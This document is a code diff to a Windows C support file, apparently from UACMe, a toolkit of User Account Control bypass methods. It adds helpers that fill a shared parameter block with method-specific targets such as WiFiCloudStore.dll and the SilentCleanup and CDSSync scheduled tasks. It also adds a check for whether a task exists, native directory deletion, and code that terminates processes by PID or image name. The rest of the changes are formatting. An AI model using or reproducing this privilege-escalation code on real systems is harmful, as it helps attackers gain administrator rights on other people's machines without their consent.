@@ -787,6 +787,51 @@ void supCopyMemory(
 }
 
 /*
+* supQueryEnvironmentVariable
+*
+* Purpose:
+*
+* Query environment variable.
+*
+*/
+_Success_(return != FALSE)
+BOOL supQueryEnvironmentVariable(
+    _In_ LPCWSTR Name,
+    _Out_ LPWSTR Buffer,
+    _In_ ULONG BufferLength
+)
+{
+    NTSTATUS ntStatus;
+    UNICODE_STRING usName;
+    UNICODE_STRING usValue;
+
+    if (Name == NULL || Buffer == NULL || BufferLength == 0)
+        return FALSE;
+
+    RtlSecureZeroMemory(Buffer, BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlInitUnicodeStringEx(&usName, Name);
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    usValue.Buffer = Buffer;
+    usValue.Length = 0;
+    usValue.MaximumLength = (USHORT)(BufferLength * sizeof(WCHAR));
+
+    ntStatus = RtlQueryEnvironmentVariable_U(
+        NULL,
+        &usName,
+        &usValue);
+
+    if (!NT_SUCCESS(ntStatus))
+        return FALSE;
+
+    Buffer[usValue.Length / sizeof(WCHAR)] = 0;
+
+    return TRUE;
+}
+
+/*
 * supQueryEnvironmentVariableOffset
 *
 * Purpose:
@@ -1068,7 +1113,7 @@ VOID NTAPI supxLdrEnumModulesCallback(
 * Purpose:
 *
 * Fake/Restore current process information for COM elevation.
-* 
+*
 * RAiGetTokenForCOM -> AipGetTokenForService -> AiCheckSecureApplicationDirectory
 *
 */
@@ -1626,7 +1671,7 @@ BOOL supReplaceEnvironmentVariableValue(
     _In_ LPWSTR lpVariableName,
     _In_ DWORD dwType,
     _In_opt_ LPWSTR lpVariableData,
-    _Out_opt_ PVOID *lpOldVariableData
+    _Out_opt_ PVOID * lpOldVariableData
 )
 {
     BOOL        bNameAllocated = FALSE, bDoBackup = (lpOldVariableData != NULL);
@@ -2162,7 +2207,7 @@ BOOL supIsCorImageFile(
 */
 NTSTATUS supCreateDirectory(
     _Out_opt_ PHANDLE phDirectory,
-    _In_ OBJECT_ATTRIBUTES* ObjectAttributes,
+    _In_ OBJECT_ATTRIBUTES * ObjectAttributes,
     _In_ ULONG DirectoryShareFlags,
     _In_ ULONG DirectoryAttributes
 )
@@ -2195,6 +2240,44 @@ NTSTATUS supCreateDirectory(
 }
 
 /*
+* supRemoveDirectory
+*
+* Purpose:
+*
+* Native remove directory.
+*
+*/
+BOOL supRemoveDirectory(
+    _In_ LPCWSTR lpDirectory
+)
+{
+    UNICODE_STRING usDirectory;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+    if (lpDirectory == NULL || *lpDirectory == 0) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    if (RtlDosPathNameToNtPathName_U(lpDirectory, &usDirectory, NULL, NULL)) {
+
+        InitializeObjectAttributes(
+            &ObjectAttributes,
+            &usDirectory,
+            OBJ_CASE_INSENSITIVE,
+            NULL,
+            NULL);
+
+        status = NtDeleteFile(&ObjectAttributes);
+        RtlFreeUnicodeString(&usDirectory);
+    }
+
+    supSetLastErrorFromNtStatus(status);
+    return NT_SUCCESS(status);
+}
+
+/*
 * supxCreateBoundaryDescriptorSID
 *
 * Purpose:
@@ -2203,9 +2286,9 @@ NTSTATUS supCreateDirectory(
 *
 */
 PSID supxCreateBoundaryDescriptorSID(
-    SID_IDENTIFIER_AUTHORITY* SidAuthority,
+    SID_IDENTIFIER_AUTHORITY * SidAuthority,
     UCHAR SubAuthorityCount,
-    ULONG* SubAuthorities
+    ULONG * SubAuthorities
 )
 {
     BOOL    bResult = FALSE;
@@ -2236,6 +2319,35 @@ PSID supxCreateBoundaryDescriptorSID(
     return pSid;
 }
 
+VOID supSetMethodSpecificDataToParametersBlock(
+    _In_ UCM_METHOD Method,
+    _In_ PUACME_PARAM_BLOCK ParamBlock
+)
+{
+    switch (Method) {
+
+    case UacMethodQuickAssist:
+        _strcpy(ParamBlock->szOptionalParameter1, TEXT("\\System32\\WiFiCloudStore.dll"));
+        _strcpy(ParamBlock->szOptionalParameter2, TEXT("\\Microsoft\\Windows\\WlanSvc\\CDSSync"));
+        break;
+
+    case UacMethodTabTip:
+    case UacMethodNarrator:
+        if (supQueryEnvironmentVariable(
+            L"USERPROFILE",
+            ParamBlock->szOptionalParameter1,
+            RTL_NUMBER_OF(ParamBlock->szOptionalParameter1)))
+        {
+            _strcat(ParamBlock->szOptionalParameter1, L"\\Documents\\desktop.ini");
+            _strcpy(ParamBlock->szOptionalParameter2, L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
+        }
+        break;
+
+    default:
+        break;
+    }
+}
+
 /*
 * supCreateSharedParametersBlock
 *
@@ -2245,10 +2357,12 @@ PSID supxCreateBoundaryDescriptorSID(
 *
 */
 BOOL supCreateSharedParametersBlock(
-    _In_ PVOID ucmContext)
+    _In_ PVOID ucmContext,
+    _In_ UCM_METHOD ucmMethod,
+    _Inout_ PUACME_PARAM_BLOCK pSharedParams
+)
 {
     BOOL    bResult = FALSE;
-    ULONG   r;
     HANDLE  hBoundary = NULL;
     PVOID   SharedBuffer = NULL;
     SIZE_T  ViewSize;
@@ -2263,8 +2377,6 @@ BOOL supCreateSharedParametersBlock(
     UNICODE_STRING usName;
     OBJECT_ATTRIBUTES obja = RTL_INIT_OBJECT_ATTRIBUTES((PUNICODE_STRING)NULL, 0);
 
-    UACME_PARAM_BLOCK ParamBlock;
-
     ULONG SubAuthoritiesWorld[] = { SECURITY_WORLD_RID };
 
     WCHAR szBoundaryDescriptorName[128];
@@ -2277,18 +2389,13 @@ BOOL supCreateSharedParametersBlock(
     //
     // Fill parameters block.
     // 
-    RtlSecureZeroMemory(&ParamBlock, sizeof(ParamBlock));
-
     if (context->OptionalParameterLength != 0) {
-        _strncpy(ParamBlock.szParameter, MAX_PATH,
+        _strncpy(pSharedParams->szParameter, MAX_PATH,
             context->szOptionalParameter, MAX_PATH);
     }
 
-    ParamBlock.AkagiFlag = context->AkagiFlag;
-    ParamBlock.SessionId = NtCurrentPeb()->SessionId;
-
-    supWinstationToName(NULL, ParamBlock.szWinstation, MAX_PATH * 2, &r);
-    supDesktopToName(NULL, ParamBlock.szDesktop, MAX_PATH * 2, &r);
+    pSharedParams->Flags = context->Flags;
+    pSharedParams->SessionId = NtCurrentPeb()->SessionId;
 
     do {
         //
@@ -2326,17 +2433,20 @@ BOOL supCreateSharedParametersBlock(
         obja.ObjectName = &usName;
 
         //
-        // Create completion event.
+        // Create completion event name.
         //
         RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
         supGenerateSharedObjectName((WORD)AKAGI_COMPLETION_EVENT_ID, szObjectName);
         RtlInitUnicodeString(&usName, szObjectName);
-        _strcpy(ParamBlock.szSignalObject, szObjectName);
+        _strcpy(pSharedParams->szSignalObject, szObjectName);
+
+        pSharedParams->MethodId = ucmMethod;
+        supSetMethodSpecificDataToParametersBlock(ucmMethod, pSharedParams);
 
         //
         // Param block is complete. Calc crc32.
         //
-        ParamBlock.Crc32 = RtlComputeCrc32(0, &ParamBlock, sizeof(ParamBlock));
+        pSharedParams->Crc32 = RtlComputeCrc32(0, pSharedParams, sizeof(UACME_PARAM_BLOCK));
 
         if (!NT_SUCCESS(NtCreateEvent(
             &context->SharedContext.hCompletionEvent,
@@ -2383,7 +2493,7 @@ BOOL supCreateSharedParametersBlock(
                 PAGE_READWRITE)))
             {
                 RtlSecureZeroMemory(SharedBuffer, PAGE_SIZE);
-                RtlCopyMemory(SharedBuffer, &ParamBlock, sizeof(ParamBlock));
+                RtlCopyMemory(SharedBuffer, pSharedParams, sizeof(UACME_PARAM_BLOCK));
                 NtUnmapViewOfSection(NtCurrentProcess(), SharedBuffer);
                 bResult = TRUE;
             }
@@ -2494,7 +2604,7 @@ PVOID supCreateUacmeContext(
     //
     // Set Fubuki flag.
     //
-    Context->AkagiFlag = AKAGI_FLAG_KILO;
+    Context->QueryRuntimeInformation = FALSE;
 
     //
     // Remember NtBuildNumber.
@@ -3018,7 +3128,7 @@ PVOID supFindPattern(
 *
 */
 PVOID supLookupImageSectionByName(
-    _In_ CHAR* SectionName,
+    _In_ CHAR * SectionName,
     _In_ ULONG SectionNameLength,
     _In_ PVOID DllBase,
     _Out_ PULONG SectionSize
@@ -3138,7 +3248,7 @@ VOID supEnumUserAssocSetDB(
 *
 */
 NTSTATUS supFindUserAssocSet(
-    _Out_ USER_ASSOC_PTR* Function
+    _Out_ USER_ASSOC_PTR * Function
 )
 {
     HANDLE  hModule;
@@ -3284,7 +3394,7 @@ NTSTATUS supFindUserAssocSet(
 NTSTATUS supRegisterShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc,
+    _In_ USER_ASSOC_PTR * UserAssocFunc,
     _In_ LPCWSTR lpszPayload,
     _In_ BOOL fCustomURIScheme,
     _In_opt_ LPCWSTR pszDefaultValue
@@ -3443,7 +3553,7 @@ NTSTATUS supUnregisterShellAssocEx(
     _In_ BOOLEAN fResetOnly,
     _In_ LPCWSTR pszExt,
     _In_opt_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
@@ -3505,7 +3615,7 @@ NTSTATUS supUnregisterShellAssocEx(
 NTSTATUS supUnregisterShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     return supUnregisterShellAssocEx(FALSE,
@@ -3525,7 +3635,7 @@ NTSTATUS supUnregisterShellAssoc(
 NTSTATUS supResetShellAssoc(
     _In_ LPCWSTR pszExt,
     _In_opt_ LPCWSTR pszProgId,
-    _In_ USER_ASSOC_PTR* UserAssocFunc
+    _In_ USER_ASSOC_PTR * UserAssocFunc
 )
 {
     return supUnregisterShellAssocEx(TRUE,
@@ -3533,6 +3643,96 @@ NTSTATUS supResetShellAssoc(
         pszProgId,
         UserAssocFunc);
 
+}
+
+/*
+* supIsTaskExist
+*
+* Purpose:
+*
+* Check if the given task registered in task scheduler.
+*
+*/
+BOOL supIsTaskExists(
+    _In_ LPCWSTR TaskFolder,
+    _In_ LPCWSTR TaskName
+)
+{
+    BOOL bResult = FALSE;
+    HRESULT hr;
+
+    ITaskService* pService = NULL;
+    ITaskFolder* pRootFolder = NULL;
+    IRegisteredTask* pTask = NULL;
+
+    BSTR bstrTaskFolder = NULL;
+    BSTR bstrTask = NULL;
+    VARIANT varDummy;
+
+    do {
+
+        bstrTaskFolder = SysAllocString(TaskFolder);
+        if (bstrTaskFolder == NULL)
+            break;
+
+        bstrTask = SysAllocString(TaskName);
+        if (bstrTask == NULL)
+            break;
+
+        hr = CoCreateInstance(&CLSID_TaskScheduler,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            &IID_ITaskService,
+            (void**)&pService);
+
+        if (FAILED(hr))
+            break;
+
+        VariantInit(&varDummy);
+
+        hr = pService->lpVtbl->Connect(pService,
+            varDummy,
+            varDummy,
+            varDummy,
+            varDummy);
+
+        if (FAILED(hr))
+            break;
+
+        hr = pService->lpVtbl->GetFolder(pService,
+            bstrTaskFolder,
+            &pRootFolder);
+
+        if (FAILED(hr))
+            break;
+
+        hr = pRootFolder->lpVtbl->GetTask(pRootFolder,
+            bstrTask,
+            &pTask);
+
+        if (FAILED(hr))
+            break;
+
+        bResult = TRUE;
+
+    } while (FALSE);
+
+    if (bstrTaskFolder)
+        SysFreeString(bstrTaskFolder);
+
+    if (bstrTask)
+        SysFreeString(bstrTask);
+
+    if (pTask)
+        pTask->lpVtbl->Release(pTask);
+
+    if (pRootFolder)
+        pRootFolder->lpVtbl->Release(pRootFolder);
+
+    if (pService)
+        pService->lpVtbl->Release(pService);
+
+    return bResult;
 }
 
 /*
@@ -3708,7 +3908,7 @@ HANDLE supRunProcessFromParent(
     _In_opt_ LPWSTR lpCurrentDirectory,
     _In_ ULONG CreationFlags,
     _In_ WORD ShowWindowFlags,
-    _Out_opt_ HANDLE* PrimaryThread
+    _Out_opt_ HANDLE * PrimaryThread
 )
 {
     BOOL bResult = FALSE;
@@ -3798,7 +3998,7 @@ HANDLE supRunProcessFromParent(
 */
 RPC_STATUS supCreateBindingHandle(
     _In_ RPC_WSTR RpcInterfaceUuid,
-    _Out_ RPC_BINDING_HANDLE* BindingHandle
+    _Out_ RPC_BINDING_HANDLE * BindingHandle
 )
 {
     RPC_STATUS status = RPC_S_INTERNAL_ERROR;
@@ -4242,7 +4442,7 @@ ULONG supWaitForChildProcesses(
             Sleep(1000);
             dwCurrentWait += 1000;
         }
-        else 
+        else
             break;
 
     } while (dwCurrentWait <= dwMaxWait);
@@ -4459,6 +4659,93 @@ BOOL supxExamineTaskhost(
 }
 
 /*
+* supIsProcessElevated
+*
+* Purpose:
+*
+* Check if process token has elevated flag set.
+*
+*/
+BOOL supIsProcessElevated(
+    _In_ HANDLE ProcessHandle
+)
+{
+    BOOL bResult = FALSE;
+    HANDLE tokenHandle = NULL;
+    TOKEN_ELEVATION tokenInfo;
+    ULONG returnLength = 0;
+
+    if (ProcessHandle == NULL) {
+        return FALSE;
+    }
+
+    if (!NT_SUCCESS(NtOpenProcessToken(
+        ProcessHandle,
+        TOKEN_QUERY,
+        &tokenHandle)))
+    {
+        return FALSE;
+    }
+
+    tokenInfo.TokenIsElevated = 0;
+
+    if (NT_SUCCESS(NtQueryInformationToken(
+        tokenHandle,
+        TokenElevation,
+        &tokenInfo,
+        sizeof(tokenInfo),
+        &returnLength)))
+    {
+        bResult = (tokenInfo.TokenIsElevated != 0);
+    }
+
+    NtClose(tokenHandle);
+
+    return bResult;
+}
+
+/*
+* supxTerminateProcess
+*
+* Purpose:
+*
+* Terminate process by PID.
+*
+*/
+BOOL supxTerminateProcess(
+    _In_ HANDLE UniqueProcessId,
+    _In_ BOOL ElevatedOnly
+)
+{
+    HANDLE processHandle = NULL;
+    CLIENT_ID cid;
+    OBJECT_ATTRIBUTES obja;
+
+    cid.UniqueProcess = UniqueProcessId;
+    cid.UniqueThread = NULL;
+
+    InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
+    if (NT_SUCCESS(NtOpenProcess(&processHandle,
+        MAXIMUM_ALLOWED,
+        &obja,
+        &cid)))
+    {
+        if (ElevatedOnly) {
+            if (!supIsProcessElevated(processHandle)) {
+                NtClose(processHandle);
+                return FALSE;
+            }
+        }
+
+        NtTerminateProcess(processHandle, 0);
+        NtClose(processHandle);
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+/*
 * supEnumTaskhostTasksCallback
 *
 * Purpose:
@@ -4477,7 +4764,30 @@ BOOL CALLBACK supEnumTaskhostTasksCallback(
         return FALSE;
 
     supxExamineTaskhost(ProcessEntry->UniqueProcessId);
+    supxTerminateProcess(ProcessEntry->UniqueProcessId, FALSE);
 
+    return FALSE;
+}
+
+/*
+* supTerminateProcessCallback
+*
+* Purpose:
+*
+* Callback for process termination.
+*
+*/
+BOOL CALLBACK supTerminateProcessCallback(
+    _In_ PSYSTEM_PROCESS_INFORMATION ProcessEntry,
+    _In_ PVOID UserContext
+)
+{
+    PUNICODE_STRING targetProcess = (PUNICODE_STRING)UserContext;
+
+    if (!RtlEqualUnicodeString(&ProcessEntry->ImageName, targetProcess, TRUE))
+        return FALSE;
+
+    supxTerminateProcess(ProcessEntry->UniqueProcessId, FALSE);
     return FALSE;
 }
 
@@ -4614,7 +4924,7 @@ BOOLEAN supReplaceVersionInfo(
             break;
         }
 
-        if (!UpdateResource(hUpdate, RT_VERSION, MAKEINTRESOURCEW(1), 
+        if (!UpdateResource(hUpdate, RT_VERSION, MAKEINTRESOURCEW(1),
             MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
             pvBuffer, dwResourceSize))
         {
